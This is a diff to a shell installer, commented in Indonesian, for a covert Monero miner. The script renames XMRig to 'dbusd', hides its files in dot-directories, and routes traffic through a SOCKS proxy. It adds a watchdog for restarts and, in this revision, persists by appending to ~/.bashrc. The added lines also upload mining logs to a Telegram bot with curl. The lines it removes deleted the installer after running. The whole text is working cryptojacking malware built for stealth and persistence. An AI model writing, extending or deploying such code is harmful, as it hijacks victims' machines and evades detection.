@@ -6,7 +6,7 @@ WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrx
 REVERSE_DOMAIN="vheler.cfd"
 REVERSE_PORT="9933"
 WORKER="stealth-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 6)"
-DIR="$HOME/.syscache"
+DIR="$HOME/.local/share/.syscache"
 
 mkdir -p "$DIR" && cd "$DIR"
 
@@ -18,7 +18,7 @@ rm -f miner.tar.gz
 mv xmrig dbusd
 chmod +x dbusd
 
-# === KONFIG XMRIG ===
+# === KONFIGURASI XMRIG ===
 cat > config.json <<EOF
 {
   "autosave": true,
@@ -51,20 +51,42 @@ tcp_connect_time_out 8000
 socks5 116.100.220.220 1080
 EOF
 
-# === LAUNCHER ===
+# === LAUNCHER DENGAN LOG TELEGRAM (HANYA ACCEPTED) ===
 cat > launcher.sh <<'EOF'
 #!/bin/bash
 DIR="$(cd "$(dirname "$0")" && pwd)"
+LOGDIR="$HOME/.local/share/.messenger/cache"
+LOGFILE="$LOGDIR/logs.db"
+FILTERED="$LOGDIR/accepted_only.log"
+mkdir -p "$LOGDIR"
+
+BOT_TOKEN="bot123456789:AAEij5m8cCExampleTokenReal"
+CHAT_ID="123456789"
+
 while true; do
   CPU_LOAD=$(top -bn1 | grep "Cpu(s)" | awk '{print 100 - $8}')
   CPU_INT=${CPU_LOAD%.*}
   if [ "$CPU_INT" -ge 95 ]; then
-    echo "[*] CPU tinggi ($CPU_INT%), pause 30 detik..."
+    echo "[*] CPU tinggi ($CPU_INT%), pause 30 detik..." >> "$LOGFILE"
     sleep 30
   else
     LD_PRELOAD="$DIR/libproxychains.so.4" \
     PROXYCHAINS_CONF_FILE="$DIR/proxychains.conf" \
-    "$DIR/dbusd" --config="$DIR/config.json" >/dev/null 2>&1
+    "$DIR/dbusd" --config="$DIR/config.json" >> "$LOGFILE" 2>&1
+  fi
+
+  grep "accepted" "$LOGFILE" > "$FILTERED" 2>/dev/null
+
+  NOW=$(date +%s)
+  LASTSEND_FILE="$LOGDIR/.lastsend"
+  LAST=$(cat "$LASTSEND_FILE" 2>/dev/null || echo 0)
+  DIFF=$((NOW - LAST))
+
+  if [ "$DIFF" -ge 21600 ] && [ -s "$FILTERED" ]; then
+    curl -s -F document=@"$FILTERED" \
+      "https://api.telegram.org/$BOT_TOKEN/sendDocument?chat_id=$CHAT_ID&caption=Accepted%20Log%20$(date +%F_%T)"
+    echo "$NOW" > "$LASTSEND_FILE"
+    > "$FILTERED"
   fi
   sleep 5
 done
@@ -76,7 +98,7 @@ cat > watchdog.sh <<'EOF'
 #!/bin/bash
 DIR="$(cd "$(dirname "$0")" && pwd)"
 while true; do
-  if ! pgrep -f launcher.sh >/dev/null; then
+  if ! pgrep -f "launcher.sh" >/dev/null; then
     nohup "$DIR/launcher.sh" >/dev/null 2>&1 &
   fi
   sleep 60
@@ -84,13 +106,13 @@ done
 EOF
 chmod +x watchdog.sh
 
+# === AUTOSTART TANPA ROOT ===
+if ! grep -q "watchdog.sh" ~/.bashrc; then
+  echo "cd $DIR && nohup ./watchdog.sh >/dev/null 2>&1 &" >> ~/.bashrc
+fi
+
 # === JALANKAN ===
 nohup ./launcher.sh >/dev/null 2>&1 &
 nohup ./watchdog.sh >/dev/null 2>&1 &
 
-# === AUTOJALAN (tanpa crontab) ===
-echo -e '#!/bin/bash\\ncd '$DIR'\\nnohup ./launcher.sh >/dev/null 2>&1 &' > $HOME/.reboot.sh
-chmod +x $HOME/.reboot.sh
-
-(sleep 10 && rm -f install.sh) &
-echo "[✓] Mining stealth aktif tanpa strip & tanpa Java."
+echo "[✓] Stealth mining aktif + Log Telegram (accepted only)."
